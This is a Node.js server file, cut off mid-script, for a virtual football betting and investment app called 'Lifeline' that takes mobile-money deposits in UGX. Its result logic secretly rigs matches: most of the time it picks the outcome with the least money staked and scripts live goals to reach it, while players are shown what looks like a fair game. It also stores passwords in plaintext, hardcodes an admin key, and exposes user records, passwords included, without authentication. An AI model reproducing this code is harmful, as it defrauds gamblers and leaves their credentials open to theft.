const express=require('express');
const mysql=require('mysql2/promise');
const cors=require('cors');
const app=express();
app.use(cors());
app.use(express.json({limit:'50mb'}));
let db;
const ADMIN_KEY="LIFELINE123";

// 16 TEAMS WITH PLAYERS
const TEAMS_16 = [
 {name:'Arsenal',short:'ARS', players:['Saka','Martinelli','Havertz','Odegaard','Jesus']},
 {name:'Man City',short:'MCI', players:['Haaland','Foden','De Bruyne','Alvarez','Grealish']},
 {name:'Liverpool',short:'LIV', players:['Salah','Nunez','Diaz','Jota','Gakpo']},
 {name:'Chelsea',short:'CHE', players:['Palmer','Jackson','Sterling','Mudryk','Enzo']},
 {name:'Man Utd',short:'MUN', players:['Rashford','Fernandes','Hojlund','Garnacho','Antony']},
 {name:'Newcastle',short:'NEW', players:['Isak','Wilson','Gordon','Almiron','Guimaraes']},
 {name:'Aston Villa',short:'AVL', players:['Watkins','Bailey','Diaby','Luiz','McGinn']},
 {name:'Tottenham',short:'TOT', players:['Son','Richarlison','Kulusevski','Maddison','Johnson']},
 {name:'Brighton',short:'BHA', players:['Mitoma','Ferguson','Pedro','Gross','March']},
 {name:'West Ham',short:'WHU', players:['Bowen','Antonio','Paqueta','Kudus','Ward-Prowse']},
 {name:'Crystal Palace',short:'CRY', players:['Eze','Olise','Mateta','Ayew','Edouard']},
 {name:'Fulham',short:'FUL', players:['Jimenez','Willian','Iwobi','Pereira','Wilson']},
 {name:'Brentford',short:'BRE', players:['Toney','Mbeumo','Wissa','Jensen','Lewis-Potter']},
 {name:'Everton',short:'EVE', players:['Calvert-Lewin','Doucoure','McNeil','Harrison','Beto']},
 {name:'Wolves',short:'WOL', players:['Cunha','Neto','Hwang','Sarabia','Lemina']},
 {name:'Nottm Forest',short:'NFO', players:['Wood','Gibbs-White','Elanga','Awoniyi','Hudson-Odoi']},
];

let season=1, matchday=1;
let leagueTable={};
function initTable(){ leagueTable={}; TEAMS_16.forEach(t=>{ leagueTable[t.name]={name:t.name,short:t.short,P:0,W:0,D:0,L:0,GF:0,GA:0,GD:0,Pts:0,players:t.players}; }); }
initTable();

function genMatchday(){
  let shuffled=[...TEAMS_16].sort(()=>Math.random()-0.5);
  let fixtures=[];
  for(let i=0;i<8;i++){
    let home=shuffled[i*2]; let away=shuffled[i*2+1];
    fixtures.push({id:Date.now()+i+Math.floor(Math.random()*1000), home, away, homeScore:0, awayScore:0, minute:0, events:[], targetResult:null, result:null});
  }
  return fixtures;
}
let nextFixtures=genMatchday();
let liveFixtures=null;
let virtualPhase='betting';
let virtualTimeLeft=240;
let minuteTimer=0;

function randomResult(){ let r=Math.random(); return r<0.38?'home': r<0.64?'draw':'away'; }

async function decideAllResults(fixtures){
  let results=[];
  try{
    if(!db) return fixtures.map(()=>randomResult());
    const [singleBets]=await db.query("SELECT matchId, prediction, SUM(amount) as total FROM virtual_bets WHERE status='pending' GROUP BY matchId, prediction");
    const [accaRows]=await db.query("SELECT amount, selections FROM virtual_accas WHERE status='pending' AND season=? AND matchday=?",[season, matchday]);
    let totalsByMatch={};
    fixtures.forEach(f=> totalsByMatch[f.id]={home:0,draw:0,away:0});
    for(let b of singleBets){ if(totalsByMatch[b.matchId]) totalsByMatch[b.matchId][b.prediction]+=parseInt(b.total)||0; }
    for(let row of accaRows){
      try{
        let sels=JSON.parse(row.selections); let stake=parseInt(row.amount)||0;
        for(let s of sels){ if(totalsByMatch[s.matchId]) totalsByMatch[s.matchId][s.prediction]+=stake; }
      }catch(e){}
    }
    for(let f of fixtures){
      let t=totalsByMatch[f.id]||{home:0,draw:0,away:0};
      let sum=t.home+t.draw+t.away;
      let res;
      if(sum===0){ res=randomResult(); }
      else{
        let houseWin=Math.random()<0.75;
        if(houseWin){
          let min=Math.min(t.home||0,t.draw||0,t.away||0);
          let maxVal=Math.max(t.home,t.draw,t.away);
          let most=Object.keys(t).find(k=>t[k]===maxVal);
          let cands=Object.keys(t).filter(k=>t[k]===min);
          let filt=cands.filter(k=>k!==most);
          res=filt[0]||cands[0]||'draw';
          if(Math.random()<0.35){ let opts=['home','draw','away'].filter(o=>o!==most); res=opts[Math.floor(Math.random()*opts.length)]; }
        } else {
          let maxVal=Math.max(t.home,t.draw,t.away);
          res=Object.keys(t).find(k=>t[k]===maxVal)||'home';
        }
      }
      results.push(res);
    }
    return results;
  }catch(e){ return fixtures.map(()=>randomResult()); }
}

async function settleMatchday(fixtures){
  for(let m of fixtures){
    let res=m.targetResult||m.result;
    if(res==='draw'){
      if(m.homeScore!==m.awayScore){ let g=Math.min(Math.max(m.homeScore,m.awayScore),2); if(m.homeScore+m.awayScore===0) g=Math.random()<0.6?0:1; m.homeScore=g; m.awayScore=g; }
    } else if(res==='home' && m.homeScore<=m.awayScore) m.homeScore=m.awayScore+1;
    else if(res==='away' && m.awayScore<=m.homeScore) m.awayScore=m.homeScore+1;
    while(m.homeScore+m.awayScore>7){ if(m.homeScore>m.awayScore) m.homeScore--; else m.awayScore--; }
    if(m.homeScore<0) m.homeScore=0; if(m.awayScore<0) m.awayScore=0;
    m.result=res;
    let h=leagueTable[m.home.name]; let a=leagueTable[m.away.name];
    if(!h||!a) continue;
    h.P++; a.P++; h.GF+=m.homeScore; h.GA+=m.awayScore; a.GF+=m.awayScore; a.GA+=m.homeScore; h.GD=h.GF-h.GA; a.GD=a.GF-a.GA;
    if(res==='home'){ h.W++; h.Pts+=3; a.L++; } else if(res==='away'){ a.W++; a.Pts+=3; h.L++; } else { h.D++; a.D++; h.Pts+=1; a.Pts+=1; }
  }
  try{
    for(let f of fixtures){
      const [bets]=await db.query("SELECT * FROM virtual_bets WHERE matchId=? AND status='pending'",[f.id]);
      for(let bet of bets){
        if(bet.prediction===f.result){ let win=bet.amount*2; await db.query("UPDATE users SET gameBalance=gameBalance+? WHERE id=?",[win, bet.userId]); await db.query("UPDATE virtual_bets SET status='won', winAmount=? WHERE id=?",[win, bet.id]); }
        else await db.query("UPDATE virtual_bets SET status='lost', winAmount=0 WHERE id=?",[bet.id]);
      }
    }
    const [accas]=await db.query("SELECT * FROM virtual_accas WHERE season=? AND matchday=? AND status='pending'",[season, matchday]);
    for(let acca of accas){
      let sels=JSON.parse(acca.selections); let allWin=true;
      for(let sel of sels){ let found=fixtures.find(f=> f.id===sel.matchId); if(!found || found.result!==sel.prediction){ allWin=false; break; } }
      if(allWin){ let win=Math.floor(acca.amount*acca.odd); await db.query("UPDATE users SET gameBalance=gameBalance+? WHERE id=?",[win, acca.userId]); await db.query("UPDATE virtual_accas SET status='won', winAmount=? WHERE id=?",[win, acca.id]); }
      else await db.query("UPDATE virtual_accas SET status='lost', winAmount=0 WHERE id=?",[acca.id]);
    }
  }catch(e){ console.log(e.message); }
  matchday++; if(matchday>30){ season++; matchday=1; initTable(); }
  nextFixtures=genMatchday();
}

setInterval(async()=>{
 try{
  virtualTimeLeft--;
  if(virtualPhase==='betting'){
    if(virtualTimeLeft<=0){
      let targets=await decideAllResults(nextFixtures);
      liveFixtures=nextFixtures.map((f,i)=>{ return {...f, homeScore:0, awayScore:0, minute:0, targetResult:targets[i], events:[`0' KO ${f.home.short} vs ${f.away.short}`]}; });
      nextFixtures=[]; virtualPhase='live1'; virtualTimeLeft=180; minuteTimer=0;
    }
  } else if(virtualPhase==='live1'){
    minuteTimer++; if(minuteTimer>=4){ minuteTimer=0; liveFixtures.forEach(m=>{ m.minute++; if(Math.random()<0.035 && m.homeScore+m.awayScore<7){ let st=null; if(m.targetResult==='home' && m.homeScore<=m.awayScore) st='home'; else if(m.targetResult==='away' && m.awayScore<=m.homeScore) st='away'; else if(m.targetResult==='draw' && m.homeScore===0 && m.awayScore===0 && Math.random()<0.7) st=null; else if(m.targetResult==='draw' && m.homeScore>m.awayScore) st='away'; else if(m.targetResult==='draw' && m.awayScore>m.homeScore) st='home'; else st=Math.random()<0.5?'home':'away'; if(st){ let team=m[st]; let pl=team.players[Math.floor(Math.random()*team.players.length)]; if(st==='home'){ m.homeScore++; m.events.unshift(`${m.minute}' ${pl} (${m.home.short}) ${m.homeScore}-${m.awayScore}`);} else { m.awayScore++; m.events.unshift(`${m.minute}' ${pl} (${m.away.short}) ${m.homeScore}-${m.awayScore}`);} } } }); }
    if(virtualTimeLeft<=0){ virtualPhase='halftime'; virtualTimeLeft=60; liveFixtures.forEach(m=>{ m.minute=45; m.events.unshift(`45' HT ${m.homeScore}-${m.awayScore}`); }); }
  } else if(virtualPhase==='halftime'){
    virtualTimeLeft--; if(virtualTimeLeft<=0){ virtualPhase='live2'; virtualTimeLeft=180; minuteTimer=0; liveFixtures.forEach(m=>m.events.unshift(`46' 2nd half`)); }
  } else if(virtualPhase==='live2'){
    minuteTimer++; if(minuteTimer>=4){ minuteTimer=0; liveFixtures.forEach(m=>{ m.minute++; if(Math.random()<0.045 && m.homeScore+m.awayScore<7){ if(m.minute>=83){ if(m.targetResult==='home' && m.homeScore<=m.awayScore){ m.homeScore=m.awayScore+1; let pl=m.home.players[Math.floor(Math.random()*m.home.players.length)]; m.events.unshift(`${m.minute}' WINNER ${pl} ${m.homeScore}-${m.awayScore}`);} else if(m.targetResult==='away' && m.awayScore<=m.homeScore){ m.awayScore=m.homeScore+1; let pl=m.away.players[Math.floor(Math.random()*m.away.players.length)]; m.events.unshift(`${m.minute}' WINNER ${pl} ${m.homeScore}-${m.awayScore}`);} else if(m.targetResult==='draw' && m.homeScore!==m.awayScore && m.homeScore+m.awayScore<7){ if(m.homeScore>m.awayScore){ m.awayScore=m.homeScore; m.events.unshift(`${m.minute}' EQUALIZER`);} else { m.homeScore=m.awayScore; m.events.unshift(`${m.minute}' EQUALIZER`);} } } else { if(m.targetResult==='home' && Math.random()<0.55){ let pl=m.home.players[Math.floor(Math.random()*m.home.players.length)]; m.homeScore++; m.events.unshift(`${m.minute}' ${pl} ${m.homeScore}-${m.awayScore}`);} else if(m.targetResult==='away' && Math.random()<0.55){ let pl=m.away.players[Math.floor(Math.random()*m.away.players.length)]; m.awayScore++; m.events.unshift(`${m.minute}' ${pl} ${m.homeScore}-${m.awayScore}`);} } } }); }
    if(virtualTimeLeft<=0){ await settleMatchday(liveFixtures); virtualPhase='betting'; virtualTimeLeft=240; liveFixtures=null; }
  }
 }catch(e){}
},1000);

async function init(){
 try{
  const u=process.env.DATABASE_URL||process.env.MYSQL_URL;
  db=mysql.createPool(u+"?connectionLimit=10&keepAlive=true");
  await db.query("CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, fullName VARCHAR(100), phone VARCHAR(30), password VARCHAR(100), myReferralCode VARCHAR(20), referredBy VARCHAR(20), balance INT DEFAULT 0, gameBalance INT DEFAULT 0, miningBalance INT DEFAULT 0, referralBonus INT DEFAULT 0)");
  await db.query("CREATE TABLE IF NOT EXISTS deposits (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, phone VARCHAR(30), amount INT, airtelNo VARCHAR(30), screenshot LONGTEXT, status VARCHAR(20) DEFAULT 'pending', createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS investments (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, club VARCHAR(50), amount INT, rate INT, lockDays INT, startDate DATETIME DEFAULT CURRENT_TIMESTAMP, status VARCHAR(20) DEFAULT 'active')");
  await db.query("CREATE TABLE IF NOT EXISTS withdrawals (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, amount INT, type VARCHAR(20), status VARCHAR(20) DEFAULT 'pending', createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS virtual_bets (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, matchId BIGINT, homeTeam VARCHAR(30), awayTeam VARCHAR(30), prediction VARCHAR(10), amount INT, status VARCHAR(20) DEFAULT 'pending', winAmount INT DEFAULT 0, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS virtual_accas (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, season INT, matchday INT, selections TEXT, amount INT, odd FLOAT, status VARCHAR(20) DEFAULT 'pending', winAmount INT DEFAULT 0, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  console.log("FINAL 16 TEAMS ACCA 75% ALL READY");
 }catch(e){console.log(e.message)}
}
init();
app.get('/icon.svg',(req,res)=>{ res.set('Content-Type','image/svg+xml'); res.send(`<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512"><rect width="512" height="512" rx="120" fill="#000"/><circle cx="256" cy="256" r="190" fill="none" stroke="#FFD700" stroke-width="2"/><path d="M150 130 L150 380 Q150 400 170 400 L330 400 Q345 400 335 410 Q315 430 295 430 L170 430 Q130 430 130 390 L130 130 Q130 112 150 130Z" fill="#FFD700"/><path d="M165 375 C 250 355, 310 300, 380 170" fill="none" stroke="#FFD700" stroke-width="8" stroke-linecap="round"/><polygon points="385,145 410,170 360,180" fill="#FFD700"/></svg>`);});
app.get('/manifest.json',(req,res)=>{ res.json({name:"Lifeline",short_name:"Lifeline",start_url:"/",display:"standalone",background_color:"#080a0f",theme_color:"#FFD700",icons:[{src:"/icon.svg", sizes:"512x512"}]})});
app.get('/sw.js',(req,res)=>{ res.set('Content-Type','application/javascript'); res.send(`self.addEventListener('install',e=>self.skipWaiting());`);});
app.get('/api/virtual/status',(req,res)=>{
  let tableArr=Object.values(leagueTable).sort((a,b)=> b.Pts-a.Pts || b.GD-a.GD);
  res.json({season, matchday, phase:virtualPhase, timeLeft:virtualTimeLeft, current:liveFixtures?liveFixtures[0]:null, allLive:liveFixtures, next:nextFixtures[0]||null, nextAll:nextFixtures, table:tableArr});
});
app.get('/api/virtual/mybets/:id',async(req,res)=>{ try{ const [r]=await db.query("SELECT * FROM virtual_bets WHERE userId=? ORDER BY id DESC LIMIT 20",[req.params.id]); res.json(r); }catch(e){res.json([])} });
app.get('/api/virtual/myaccas/:id',async(req,res)=>{ try{ const [r]=await db.query("SELECT * FROM virtual_accas WHERE userId=? ORDER BY id DESC LIMIT 20",[req.params.id]); res.json(r.map(x=>{ try{ return {...x, selections: JSON.parse(x.selections)} }catch{ return x; } })); }catch(e){res.json([])} });
app.post('/api/virtual/bet',async(req,res)=>{
 try{
  const {userId, prediction, amount}=req.body;
  if(parseInt(amount)<200) return res.status(400).json({error:"Min 200"});
  const [u]=await db.query("SELECT gameBalance FROM users WHERE id=?",[userId]);
  if(!u.length || u[0].gameBalance < amount) return res.status(400).json({error:"No Game Wallet"});
  let fid, ht, at;
  if(virtualPhase==='betting'){ fid=nextFixtures[0]?.id; ht=nextFixtures[0].home.name; at=nextFixtures[0].away.name; }
  else if(virtualPhase==='halftime'){ fid=liveFixtures[0]?.id; ht=liveFixtures[0].home.name; at=liveFixtures[0].away.name; }
  else return res.status(400).json({error:"Betting pre-match & halftime only"});
  await db.query("UPDATE users SET gameBalance=gameBalance-? WHERE id=?",[parseInt(amount), userId]);
  await db.query("INSERT INTO virtual_bets (userId,matchId,homeTeam,awayTeam,prediction,amount) VALUES (?,?,?,?,?,?)",[userId, fid, ht, at, prediction, parseInt(amount)]);
  res.json({ok:1});
 }catch(e){ res.status(400).json({error:e.message}) }
});
app.post('/api/virtual/bet/acca',async(req,res)=>{
 try{
  const {userId, amount, selections}=req.body;
  if(!selections || selections.length<2) return res.status(400).json({error:"Select at least 2 matches!"});
  if(selections.length>8) return res.status(400).json({error:"Max 8"});
  if(parseInt(amount)<200) return res.status(400).json({error:"Min 200"});
  const [u]=await db.query("SELECT gameBalance FROM users WHERE id=?",[userId]);
  if(!u.length || u[0].gameBalance < amount) return res.status(400).json({error:"No Game Wallet"});
  if(virtualPhase!=='betting' && virtualPhase!=='halftime') return res.status(400).json({error:"ACCA betting pre-match & halftime only"});
  let odd=Math.pow(2, selections.length);
  if(selections.length>=4) odd*=1.2;
  if(selections.length>=6) odd*=1.5;
  if(selections.length===8) odd=256;
  await db.query("UPDATE users SET gameBalance=gameBalance-? WHERE id=?",[parseInt(amount), userId]);
  await db.query("INSERT INTO virtual_accas (userId,season,matchday,selections,amount,odd) VALUES (?,?,?,?,?,?)",[userId, season, matchday, JSON.stringify(selections), parseInt(amount), odd]);
  res.json({ok:1, odd, potential: Math.floor(parseInt(amount)*odd)});
 }catch(e){ res.status(400).json({error:e.message}) }
});
app.post('/api/register',async(req,res)=>{ try{ const code='LIFE'+Math.random().toString(36).slice(2,6).toUpperCase(); await db.query("INSERT INTO users (fullName,phone,password,myReferralCode,referredBy,balance,gameBalance) VALUES (?,?,?,?,?,0,0)",[req.body.name,req.body.phone,req.body.password,code,req.body.ref||null]); const[r]=await db.query("SELECT * FROM users WHERE phone=? ORDER BY id DESC LIMIT 1",[req.body.phone]); res.json(r[0]); }catch(e){res.status(400).json({error:e.message})} });
app.post('/api/login',async(req,res)=>{ const[r]=await db.query("SELECT * FROM users WHERE phone=? AND password=?",[req.body.phone,req.body.password]); if(r.length) res.json(r[0]); else res.status(401).json({error:"Wrong"}); });
app.get('/api/user/:id',async(req,res)=>{ const[u]=await db.query("SELECT * FROM users WHERE id=?",[req.params.id]); if(!u.length) return res.json({balance:0,gameBalance:0}); const[inv]=await db.query("SELECT * FROM investments WHERE userId=?",[req.params.id]); res.json({...u[0], investments:inv}); });
app.post('/api/deposit',async(req,res)=>{ try{ const {userId, amount, airtelNo, screenshot} = req.body; const[u]=await db.query("SELECT phone FROM users WHERE id=?",[userId]); await db.query("INSERT INTO deposits (userId,phone,amount,airtelNo,screenshot) VALUES (?,?,?,?,?)",[userId, u[0]?u[0].phone:"", parseInt(amount), airtelNo, screenshot]); res.json({ok:1}); }catch(e){ res.status(400).json({error:e.message}) } });
app.post('/api/invest',async(req,res)=>{ const{userId,club,amount}=req.body; const[u]=await db.query("SELECT balance FROM users WHERE id=?",[userId]); if(!u[0] || u[0].balance<amount) return res.status(400).json({error:"No balance"}); await db.query("UPDATE users SET balance=balance-? WHERE id=?",[amount,userId]); await db.query("INSERT INTO investments (userId,club,amount,rate,lockDays) VALUES (?,?,?,?,?)",[userId,club,amount,10,10]); res.json({ok:1}); });
app.get('/api/admin/deposits',async(req,res)=>{ if(req.query.key!==ADMIN_KEY) return res.status(401).json([]); const[r]=await db.query("SELECT * FROM deposits WHERE status='pending' ORDER BY id DESC"); res.json(r); });
app.post('/api/admin/approve/:id',async(req,res)=>{ if(req.query.key!==ADMIN_KEY) return res.status(401).json({}); const[d]=await db.query("SELECT * FROM deposits WHERE id=?",[req.params.id]); if(!d.length) return res.json({}); await db.query("UPDATE deposits SET status='approved' WHERE id=?",[req.params.id]); await db.query("UPDATE users SET balance=balance+? WHERE id=?",[d[0].amount,d[0].userId]); res.json({ok:1}); });
app.get('/api/admin/virtual',async(req,res)=>{ if(req.query.key!==ADMIN_KEY) return res.status(401).json([]); const[r]=await db.query("SELECT v.*, u.phone FROM virtual_bets v JOIN users u ON v.userId=u.id ORDER BY v.id DESC LIMIT 100"); const[r2]=await db.query("SELECT a.*, u.phone FROM virtual_accas a JOIN users u ON a.userId=u.id ORDER BY a.id DESC LIMIT 100"); res.json({singles:r, accas:r2}); });
app.get('/api/history/:id',async(req,res)=>{ try{ const uid=req.params.id; const[deps]=await db.query("SELECT id,amount,status,createdAt,'deposit' as type FROM deposits WHERE userId=?",[uid]); const[vbets]=await db.query("SELECT id,amount,status,createdAt,'virtual' as type FROM virtual_bets WHERE userId=?",[uid]); const[accas]=await db.query("SELECT id,amount,status,createdAt,'acca' as type, odd FROM virtual_accas WHERE userId=?",[uid]); let all=[...deps,...vbets,...accas].sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt)); res.json(all); }catch(e){res.json([])} });

const PWA_HEAD = `<link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#000"><link rel="icon" href="/icon.svg">`;
const FIELD_BG_CSS = `body{background:#080a0f;color:#fff;font-family:Arial;padding:12px;padding-bottom:90px}body::before{content:'';position:fixed;inset:-20px;z-index:-3;background-image:linear-gradient(rgba(0,0,0,0.5),rgba(0,0,0,0.7)),url('https://images.unsplash.com/photo-1522778119026-d647f0596c20?w=1200&q=80');background-size:110% 110%;background-position:center}.glass{background:rgba(18,22,35,0.85);backdrop-filter:blur(16px);border:1px solid rgba(255,215,0,0.15)}.field-logo-top{position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:10;background:rgba(0,0,0,0.7);border:1px solid gold;padding:6px 18px;border-radius:30px;color:gold;font-size:11px;font-weight:bold}`;
const pages = {
home: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}input,button{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:none}button{background:gold;font-weight:bold}.card{padding:20px;border-radius:20px}</style></head><body><div class="field-logo-top">16 TEAMS • 8 MATCHES • ACCA x256</div><div class="card glass" style="margin-top:60px"><h2>💎 Lifeline ACCA 16 Teams</h2><input id="n" placeholder="Name"><input id="p" placeholder="Phone"><input id="pw" type="password" placeholder="Password"><input id="cpw" type="password" placeholder="Confirm"><button onclick="reg()">Register</button><button onclick="log()" style="background:#222;color:#fff">Login</button></div><script>
async function reg(){ if(pw.value!==cpw.value){alert("No match");return;} let r=await fetch("/api/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({name:n.value,phone:p.value,password:pw.value})}); let j=await r.json();if(j.id){localStorage.setItem("uid",j.id);location.href="/dashboard"}else alert(j.error)}
async function log(){let r=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p.value,password:pw.value})});let j=await r.json();if(j.id){localStorage.setItem("uid",j.id);location.href="/dashboard"}else alert("Wrong")}</script></body></html>`,
dash: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}.bal{padding:20px;border-radius:20px;text-align:center}.walletGrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0}.walletCard{padding:12px;border-radius:14px}.virtCard{background:linear-gradient(135deg,#1a0033,#000033);border:2px solid #ff00cc;padding:14px;border-radius:16px;margin:12px 0}.liveMini{background:#111;padding:6px;border-radius:6px;margin:3px 0;font-size:10px;display:flex;justify-content:space-between}button{width:100%;padding:12px;margin:6px 0;border-radius:12px;border:none;font-weight:bold}.gold{background:gold;color:#000}.dark{background:#222;color:#fff}</style></head><body><div class="field-logo-top" id="topInfo">S1 MD1 • 8 MATCHES • ACCA x256</div><div class="bal glass" style="margin-top:60px"><div class="walletGrid"><div class="walletCard glass"><h4>GAME</h4><h2 id="gb">0</h2></div><div class="walletCard glass"><h4>INVEST</h4><h2 id="b">0</h2></div></div></div><div class="virtCard" onclick="location.href='/virtual'"><div style="display:flex;justify-content:space-between"><b style="color:#ff00cc">ACCA x256 - 8 MATCHES</b><span id="phase" style="background:#00ff88;color:#000;padding:3px 8px;border-radius:20px;font-size:9px">BETTING</span></div><div id="featured" style="margin:8px 0;font-weight:bold"></div><div id="others"></div><div style="text-align:center">⏱️ <span id="timer"></span> • Tap →</div></div><button class="gold" onclick="location.href='/virtual'">Play ACCA</button><script>
let uid=localStorage.getItem("uid");if(!uid)location.href="/";
async function load(){ let r=await fetch("/api/user/"+uid);let u=await r.json(); b.textContent=(u.balance||0).toLocaleString(); gb.textContent=(u.gameBalance||0).toLocaleString(); }
async function loadV(){ let r=await fetch("/api/virtual/status"); let d=await r.json(); document.getElementById('topInfo').textContent='S'+d.season+' MD'+d.matchday+' • 8 MATCHES • ACCA x256'; document.getElementById('phase').textContent=d.phase.toUpperCase(); document.getElementById('timer').textContent=Math.floor(d.timeLeft/60)+":"+String(d.timeLeft%60).padStart(2,'0'); if(d.phase==='betting'){ document.getElementById('featured').textContent='BET '+d.nextAll.length+' MATCHES - Odd x'+Math.pow(2,d.nextAll.length)+' - '+d.next.home.short+' vs '+d.next.away.short; } else { document.getElementById('featured').textContent='LIVE '+d.current.home.short+' '+d.current.homeScore+'-'+d.current.awayScore+' '+d.current.away.short; } let o=''; (d.allLive||d.nextAll||[]).slice(0,4).forEach(m=>{ o+='<div class=liveMini><span>'+m.home.short+' '+m.homeScore+'-'+m.awayScore+' '+m.away.short+'</span><span>'+(m.events?m.events[0].slice(0,18):'')+'</span></div>'; }); document.getElementById('others').innerHTML=o; }
load(); setInterval(loadV,1000); loadV();
</script></body></html>`,
virtual: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>
${FIELD_BG_CSS}
.liveBox{background:radial-gradient(circle,#1a0033,#000);border:2px solid #ff00cc;border-radius:16px;padding:12px;margin:10px 0;text-align:center;position:relative}
.score{font-size:28px;font-weight:900}
.phase{position:absolute;top:8px;left:10px;padding:3px 8px;border-radius:20px;font-size:9px;font-weight:bold}
.betting{background:#00ff88;color:#000}.live{background:red;color:#fff}.ht{background:orange;color:#000}
.timer{position:absolute;top:8px;right:10px;background:#ff00cc;color:#fff;padding:3px 8px;border-radius:20px;font-size:10px}
.matchCard{background:#151a28;border:1px solid rgba(255,255,255,0.08);border-radius:12px;padding:10px;margin:8px 0}
.betBtn{padding:8px 4px;border-radius:8px;border:none;font-weight:900;font-size:11px;width:31%;margin:1px;cursor:pointer}
.home{background:#00ff88;color:#000}.draw{background:gold;color:#000}.away{background:#0088ff;color:#fff}
.betBtn.sel{outline:2px solid #fff;transform:scale(1.05);box-shadow:0 0 10px gold}
.accaTicket{position:sticky;bottom:0;background:linear-gradient(180deg,#1a0033,#000);border:2px solid gold;border-radius:16px;padding:12px;margin:12px 0;z-index:5}
.event{font-size:10px;padding:3px 6px;background:rgba(255,255,255,0.06);border-radius:4px;margin:2px 0;text-align:left}
.table{max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.5);border-radius:10px;padding:6px;margin:8px 0}
.row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.06);font-size:10px}
</style></head><body>
<div class="field-logo-top" id="top">ACCA • 16 TEAMS • 8 MATCHES • x256</div>
<div style="margin-top:60px"><a href="/dashboard" style="color:gold">← Back</a>
<h2 style="color:#ff00cc">🔥 ACCA BET - Up to x256!</h2>
<p style="font-size:10px;color:#aaa">Bet 2-8 matches at once • 2=x4 • 3=x8 • 8=x256 • Max 7 goals • 0-0 allowed • Season infinity</p>
<div class="liveBox" id="featBox">Loading...</div>
<div id="allMatchesBet"></div>
<div class="accaTicket" id="ticket">
<h3 style="margin:0;color:gold">🎫 ACCA Ticket - <span id="selCount">0</span> matches</h3>
<div style="font-size:11px">Odd: <b id="odd" style="color:#ff00cc">x0</b> • Potential: <b id="pot" style="color:#00ff88">0 UGX</b></div>
<div id="selList" style="max-height:100px;overflow-y:auto;margin:6px 0;font-size:10px"></div>
<input id="accaAmt" type="number" value="500" style="width:100%;padding:10px;border-radius:8px;border:1px solid gold;background:#111;color:#fff;margin:6px 0">
<button onclick="placeAcca()" style="width:100%;padding:12px;background:linear-gradient(90deg,gold,#ff8c00);border:none;border-radius:10px;font-weight:bold;color:#000">Place ACCA Bet - High Odd!</button>
<button onclick="clearAcca()" style="width:100%;padding:6px;background:#222;color:#fff;border:none;border-radius:8px;margin-top:4px;font-size:11px">Clear</button>
<p style="font-size:9px;color:#aaa">Game: <span id="gBal">0</span> UGX • Select 2-8 matches</p>
</div>
<h3>📊 Table 16 Teams</h3><div class="table" id="table"></div>
<h3>🎫 My ACCA</h3><div id="myAccas"></div>
</div>
<script>
let uid=localStorage.getItem("uid");
let selections=[];
function toggleSel(matchId, homeTeam, awayTeam, homeShort, awayShort, pred){
  let ex=selections.findIndex(s=>s.matchId===matchId);
  if(ex!==-1){ if(selections[ex].prediction===pred){ selections.splice(ex,1); } else { selections[ex].prediction=pred; } }
  else { if(selections.length>=8){ alert("Max 8 x256"); return; } selections.push({matchId, homeTeam, awayTeam, homeShort, awayShort, prediction:pred}); }
  document.querySelectorAll('[data-match="'+matchId+'"]').forEach(b=>b.classList.remove('sel'));
  let sel=selections.find(s=>s.matchId===matchId); if(sel){ let el=document.querySelector('[data-match="'+matchId+'"][data-pred="'+sel.prediction+'"]'); if(el) el.classList.add('sel'); }
  updateTicket();
}
function updateTicket(){
  document.getElementById('selCount').textContent=selections.length;
  let odd=selections.length===0?0:Math.pow(2,selections.length); if(selections.length>=4) odd*=1.2; if(selections.length>=6) odd*=1.5; if(selections.length===8) odd=256;
  document.getElementById('odd').textContent='x'+odd.toFixed(1);
  let amt=parseInt(document.getElementById('accaAmt').value)||0; document.getElementById('pot').textContent=Math.floor(amt*odd).toLocaleString()+' UGX';
  let list=selections.map(s=>'<div style="display:flex;justify-content:space-between;background:rgba(255,215,0,0.1);padding:4px;border-radius:4px;margin:2px 0"><span>'+s.homeShort+' vs '+s.awayShort+'</span><span style="color:gold">'+s.prediction.toUpperCase()+'</span><span style="color:red;cursor:pointer" onclick="removeSel('+s.matchId+')">✕</span></div>').join(''); document.getElementById('selList').innerHTML=list||'<small style=color:#666>Select 2-8 matches below</small>';
}
function removeSel(mid){ selections=selections.filter(s=>s.matchId!==mid); document.querySelectorAll('[data-match="'+mid+'"]').forEach(b=>b.classList.remove('sel')); updateTicket(); }
function clearAcca(){ selections=[]; document.querySelectorAll('.betBtn').forEach(b=>b.classList.remove('sel')); updateTicket(); }
document.getElementById('accaAmt').addEventListener('input',updateTicket);
async function placeAcca(){
  if(selections.length<2) return alert("Select at least 2 for ACCA x4");
  let amt=parseInt(document.getElementById('accaAmt').value);
  let r=await fetch("/api/virtual/bet/acca",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid, amount:amt, selections: selections.map(s=>({matchId:s.matchId, homeTeam:s.homeTeam, awayTeam:s.awayTeam, prediction:s.prediction}))})});
